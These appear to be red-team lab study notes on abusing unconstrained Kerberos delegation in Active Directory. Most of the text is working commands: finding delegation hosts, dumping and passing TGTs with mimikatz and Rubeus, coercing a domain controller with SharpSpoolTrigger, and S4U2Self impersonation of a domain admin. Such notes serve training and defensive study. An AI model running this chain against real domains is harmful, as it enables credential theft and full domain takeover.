## Overview

- Unrestricted kerberos delegation is a privilege that can be assigned to a domain computer or a user;
- Usually, this privilege is given to computers (in this lab, it is assigned to a computer IIS01) running services like IIS, MSSQL, etc.;
- Those services usually require access to some back-end database (or some other server), so it can read/modify the database on the authenticated user's behalf;
- When a user authenticates to a computer that has unresitricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory;
- The reason TGTs get cached in memory is so the computer (with delegation rights) can impersonate the authenticated user as and when required for accessing any other services on that user's behalf.

Essentially this looks like so: `User` --- authenticates to ---> `IIS server` ---> authenticates on behalf of the user ---> `DB server`


## Find
```
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```
![[image 2.png]]
or
```
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```
![[Pasted image 20240917090836.png]]
  Domain Controllers are always permitted for unconstrained delegation.
## Execution
mimikatz
```
mimikatz # sekurlsa::tickets
```
```
mimikatz::tickets /export
```
```
mimikatz # kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[0;3c785]-2-0-40e10000-Administrator@krbtgt-OFFENSE.LOCAL.kirbi
```
```
klist 
dir \\dc01\c$
```

Rubeus
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=

steal_token 1540
```
We can also force the user to log and get his ticket chached
Monitor
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```
SharpSpoolTrigger ( DC-2 target, WEB listener)
```
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io
```
Rubeus will then capture the ticket.
```
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

  User                  :  DC-2$@DEV.CYBERBOTIC.IO
  StartTime             :  9/6/2022 9:06:14 AM
  EndTime               :  9/6/2022 7:06:14 PM
  RenewTill             :  9/13/2022 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFuj[...]lDLklP
```
**S4U2Self Abuse** because this is a local admin, not DA
if we tried the other way:
```
beacon> ls \\dc-2.dev.cyberbotic.io\c$
[-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED
```
We need to impersonate a user we know is local admin (f.e domain admin (nlamb in this case))
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

steal_token
```

